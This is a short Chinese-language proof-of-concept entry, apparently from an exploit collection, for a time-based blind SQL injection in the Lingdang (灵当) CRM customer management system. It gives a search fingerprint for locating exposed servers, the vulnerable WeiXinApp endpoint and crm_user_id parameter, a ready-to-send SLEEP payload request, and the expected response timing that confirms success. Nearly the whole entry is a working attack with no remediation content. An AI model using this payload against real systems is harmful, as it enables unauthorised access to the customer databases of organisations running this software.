# 灵当CRM客户管理系统indexsql注入

- **系统**：灵当CRM客户管理系统index　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=11%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(1)))fiAG) HTTP/1.1`

**请求体 / payload**
```
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=11%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(2)))fiAG) HTTP/1.1
Host:
```
- **预期**：200　|　响应时间>=2s